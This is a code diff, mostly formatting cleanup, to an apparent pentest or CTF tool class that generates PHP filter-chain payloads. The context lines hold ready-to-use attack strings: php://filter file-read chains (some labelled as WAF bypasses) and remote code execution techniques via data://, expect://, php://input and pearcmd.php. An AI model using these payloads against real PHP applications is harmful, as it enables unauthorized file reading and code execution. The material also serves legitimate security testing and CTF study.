@@ -9,7 +9,7 @@ Ref: Synacktiv "PHP filter chains" research, N1CTF 2023 Laravel.
 """
 
 import json
-from typing import Dict, List, Optional
+from typing import Dict, List
 
 
 class PhpFilterChainTool:
@@ -59,43 +59,44 @@ class PhpFilterChainTool:
         "P": ["convert.iconv.UTF8.CSISO2022KR", "convert.iconv.ISO2022KR.UTF16"],
         "D": ["convert.iconv.UTF8.UTF7", "convert.iconv.UTF7.UTF8"],
         "9": ["convert.iconv.UTF8.CSISO2022KR"],
-        "w": ["convert.iconv.UTF8.CSISO2022KR", "convert.iconv.ISO-IR-111.ECMA-CYRILLIC"],
+        "w": [
+            "convert.iconv.UTF8.CSISO2022KR",
+            "convert.iconv.ISO-IR-111.ECMA-CYRILLIC",
+        ],
     }
 
-    def _generate_file_read_chains(
-        self, file: str, encoding: str
-    ) -> str:
+    def _generate_file_read_chains(self, file: str, encoding: str) -> str:
         lines = [
-            f"=== PHP Filter Chains for File Read ===",
+            "=== PHP Filter Chains for File Read ===",
             f"Target: {file}",
             f"Encoding: {encoding}",
             "",
             "--- Basic Chains ---",
             "",
-            f"1. Base64 encode (most common):",
+            "1. Base64 encode (most common):",
             f"   php://filter/convert.base64-encode/resource={file}",
             "",
-            f"2. ROT13 encode:",
+            "2. ROT13 encode:",
             f"   php://filter/string.rot13/resource={file}",
             "",
-            f"3. UTF-8 to UTF-16 (triggers error with file contents):",
+            "3. UTF-8 to UTF-16 (triggers error with file contents):",
             f"   php://filter/convert.iconv.utf-8.utf-16/resource={file}",
             "",
-            f"4. Quoted-printable encode:",
+            "4. Quoted-printable encode:",
             f"   php://filter/convert.quoted-printable-encode/resource={file}",
             "",
             "--- Chained Filters (bypass WAF) ---",
             "",
-            f"5. Double base64 encode:",
+            "5. Double base64 encode:",
             f"   php://filter/convert.base64-encode|convert.base64-encode/resource={file}",
             "",
-            f"6. ROT13 + base64:",
+            "6. ROT13 + base64:",
             f"   php://filter/string.rot13|convert.base64-encode/resource={file}",
             "",
-            f"7. UTF-7 conversion (exotic encoding bypass):",
+            "7. UTF-7 conversion (exotic encoding bypass):",
             f"   php://filter/convert.iconv.UTF-8.UTF-7/resource={file}",
             "",
-            f"8. Zlib compression + base64:",
+            "8. Zlib compression + base64:",
             f"   php://filter/zlib.deflate|convert.base64-encode/resource={file}",
             "",
             "--- iconv Chain Technique (Synacktiv) ---",
@@ -143,7 +144,7 @@ class PhpFilterChainTool:
             "Use the Synacktiv tool: https://github.com/synacktiv/php_filter_chain_generator",
             "",
             "Example command:",
-            f'  python3 php_filter_chain_generator.py --chain \'<?php {payload} ?>\'',
+            f"  python3 php_filter_chain_generator.py --chain '<?php {payload} ?>'",
             "",
             "--- Technique 2: data:// Wrapper (simpler, often blocked) ---",
             "",
@@ -152,19 +153,19 @@ class PhpFilterChainTool:
             "",
             "--- Technique 3: expect:// Wrapper (if enabled) ---",
             "",
-            f"  expect://id",
+            "  expect://id",
             f"  expect://{payload}",
             "",
             "--- Technique 4: input:// Wrapper (with POST body) ---",
             "",
-            f"  php://input",
+            "  php://input",
             f"  POST body: <?php {payload} ?>",
             "",
             "--- Technique 5: Pearcmd.php (PHP Pear auto-installed) ---",
             "",
             "  /usr/local/lib/php/pearcmd.php",
             "  Params: +config-create+/&file=/usr/local/lib/php/pearcmd.php",
-            f'  +install+--installroot+/tmp+channel://pear.php.net/{payload}',
+            f"  +install+--installroot+/tmp+channel://pear.php.net/{payload}",
         ]
         return "\n".join(lines)
 
@@ -272,6 +273,7 @@ class PhpFilterChainTool:
     def _pseudo_base64(payload: str) -> str:
         """Simple placeholder — in real use, base64 encode the PHP payload."""
         import base64
+
         full = f"<?php {payload} ?>"
         return base64.b64encode(full.encode()).decode()
 
